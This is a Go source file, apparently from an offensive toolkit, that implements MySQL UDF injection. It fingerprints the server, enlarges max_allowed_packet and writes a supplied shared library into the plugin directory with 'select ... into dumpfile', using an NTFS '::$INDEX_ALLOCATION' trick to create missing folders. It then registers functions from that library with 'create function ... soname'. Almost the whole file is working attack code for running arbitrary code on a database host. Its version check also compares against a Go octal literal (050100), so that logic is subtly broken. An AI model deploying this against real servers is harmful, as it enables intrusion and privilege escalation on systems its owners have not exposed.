package injecter

import (
	"encoding/hex"
	"fmt"
	"strconv"
	"strings"

	"github.com/pkg/errors"
)

type UDF struct {
	Name string
	Data []byte
}

type Func struct {
	Name   string
	Return string // return type
}

// Inject
// udf:
// windows_386:*UDF
// windows_amd64:*UDF
// linux_386:*UDF
// linux_amd64:*UDF
func Inject(handle Handle, udf map[string]*UDF, funcs []Func) error {
	if len(udf) == 0 || len(funcs) == 0 {
		return errors.New("no UDF or no Functions")
	}
	if !IsDynamic(handle) {
		return errors.New("not dynamic")
	}
	// select inject method
	version, err := GetVersion(handle)
	if err != nil {
		return err
	}
	ver, err := ParseVersion(version)
	if err != nil {
		return err
	}
	// select inject udf
	os, err := GetOS(handle)
	if err != nil {
		return err
	}
	arch, err := GetMachine(handle)
	if err != nil {
		return err
	}
	udfData, ok := udf[os+"_"+arch]
	if !ok { // try all udf
		for _, u := range udf {
			// version < 5.1.xx
			if ver < 050100 {
				err = injectUDF(handle, u, funcs, false)
				if err == nil {
					return nil
				}
			} else {
				err = injectUDF(handle, u, funcs, true)
				if err == nil {
					return nil
				}
			}
		}
		return errors.New("all failed")
	}
	// version < 5.1.xx
	if ver < 050100 {
		return injectUDF(handle, udfData, funcs, false)
	}
	return injectUDF(handle, udfData, funcs, true)
}

// v51: version > 5.1.xx
func injectUDF(handle Handle, udf *UDF, funcs []Func, v51 bool) error {
	// check MaxAllowedPacket
	size, err := GetMaxAllowedPacket(handle)
	if err != nil {
		return err
	}
	expectSize := len(udf.Data) + 512
	var setMaxAllowedPacket bool
	if size < expectSize {
		err = SetMaxAllowedPacket(handle, expectSize)
		if err != nil {
			return err
		}
		setMaxAllowedPacket = true
	}
	// dump udf
	var path string
	if v51 { // 5.1.xx
		// get plugin path
		dir, err := GetPluginDir(handle)
		if err != nil {
			return err
		}
		path = dir + "/" + udf.Name
	} else { // 5.0.xx
		// dump current path
		path = udf.Name
	}
	err = DumpFile(handle, udf.Data, path)
	if err != nil {
		return err
	}
	// create funcs
	for i := 0; i < len(funcs); i++ {
		err = CreateFunc(handle, funcs[i], udf.Name)
		if err != nil {
			return err
		}
	}
	// recovery MaxAllowedPacket
	if setMaxAllowedPacket {
		return SetMaxAllowedPacket(handle, size)
	}
	return nil
}

// IsDynamic
func IsDynamic(handle Handle) bool {
	result, err := handle.Query("select @@have_dynamic_loading")
	if err != nil {
		return false
	}
	b, ok := result[0]["@@have_dynamic_loading"]
	if !ok {
		return false
	}
	return b == "YES"
}

// GetVersion
// "8.0.15"
func GetVersion(handle Handle) (string, error) {
	result, err := handle.Query("select @@version")
	if err != nil {
		return "", errors.WithMessage(err, "get version failed")
	}
	if ver, ok := result[0]["@@version"]; ok {
		return ver, nil
	}
	return "", errors.New("no version")
}

// ParseVersion
// "8.0.15" = 08|00|15 -> 80015(int)
func ParseVersion(version string) (ver int, err error) {
	err = errors.Errorf("invalid version: %s", version)
	sub := strings.Split(version, ".")
	if len(sub) != 3 {
		return
	}
	n, err := strconv.Atoi(sub[0])
	if err != nil {
		return
	}
	ver = n * 10000
	n, err = strconv.Atoi(sub[1])
	if err != nil {
		return
	}
	ver += n * 100
	n, err = strconv.Atoi(sub[2])
	if err != nil {
		return
	}
	return ver + n, nil
}

// GetOS
func GetOS(handle Handle) (string, error) {
	const errPrefix = "get version_compile_os failed"
	result, err := handle.Query("select @@version_compile_os")
	if err != nil {
		return "", errors.WithMessage(err, errPrefix)
	}
	os, ok := result[0]["@@version_compile_os"]
	if !ok {
		return "", errors.New("no version_compile_os")
	}
	if strings.Contains(os, "Win") {
		return "windows", nil
	}
	return "linux", nil
}

// GetMachine
func GetMachine(handle Handle) (string, error) {
	const errPrefix = "get version_compile_machine failed"
	result, err := handle.Query("select @@version_compile_machine")
	if err != nil {
		return "", errors.WithMessage(err, errPrefix)
	}
	os, ok := result[0]["@@version_compile_machine"]
	if !ok {
		return "", errors.New("no version_compile_machine")
	}
	if strings.Contains(os, "64") {
		return "amd64", nil
	}
	return "386", nil
}

// GetMaxAllowedPacket
// 1073741824
func GetMaxAllowedPacket(handle Handle) (int, error) {
	const errPrefix = "get max_allowed_packet failed"
	result, err := handle.Query("select @@max_allowed_packet")
	if err != nil {
		return 0, errors.WithMessage(err, errPrefix)
	}
	value, ok := result[0]["@@max_allowed_packet"]
	if !ok {
		return 0, errors.New("no max_allowed_packet")
	}
	v, err := strconv.Atoi(value)
	if err != nil {
		return 0, errors.WithMessage(err, errPrefix)
	}
	return v, nil
}

// SetMaxAllowedPacket
func SetMaxAllowedPacket(handle Handle, value int) error {
	query := fmt.Sprintf("set global max_allowed_packet = %d", value)
	err := handle.Exec(query)
	if err != nil {
		return errors.WithMessage(err, "set max_allowed_packet failed")
	}
	return nil
}

// GetPluginDir
// return plugin path
func GetPluginDir(handle Handle) (string, error) {
	const (
		errPrefix = "create plugin dir failed"
		lib       = "lib::$INDEX_ALLOCATION"
		plugin    = "lib/plugin::$INDEX_ALLOCATION"
	)
	// get basedir
	result, err := handle.Query("select @@basedir")
	if err != nil {
		return "", errors.WithMessage(err, errPrefix)
	}
	baseDir, ok := result[0]["@@basedir"]
	if !ok {
		return "", errors.New(errPrefix + ": no base dir")
	}
	baseDir = strings.Replace(baseDir, "\\", "/", -1)
	// create lib/plugin
	_ = DumpFile(handle, []byte(RandomStr(16)), baseDir+lib)
	_ = DumpFile(handle, []byte(RandomStr(16)), baseDir+plugin)
	return baseDir + "lib/plugin", nil
}

// DumpFile
func DumpFile(handle Handle, data []byte, path string) error {
	h := hex.EncodeToString(data)
	query := fmt.Sprintf("select unhex('%s') into dumpfile '%s'", h, path)
	err := handle.Exec(query)
	if err != nil {
		return errors.WithMessage(err, "dumpfile failed")
	}
	return nil
}

// CreateFunc
// path: soname path
func CreateFunc(handle Handle, f Func, path string) error {
	query := fmt.Sprintf("create function %s returns %s soname '%s'", f.Name, f.Return, path)
	err := handle.Exec(query)
	if err != nil {
		return errors.WithMessage(err, "create function failed")
	}
	return nil
}

// DropFunc
func DropFunc(handle Handle, name string) error {
	query := fmt.Sprintf("drop function %s", name)
	err := handle.Exec(query)
	if err != nil {
		return errors.WithMessage(err, "delete function failed")
	}
	return nil
}
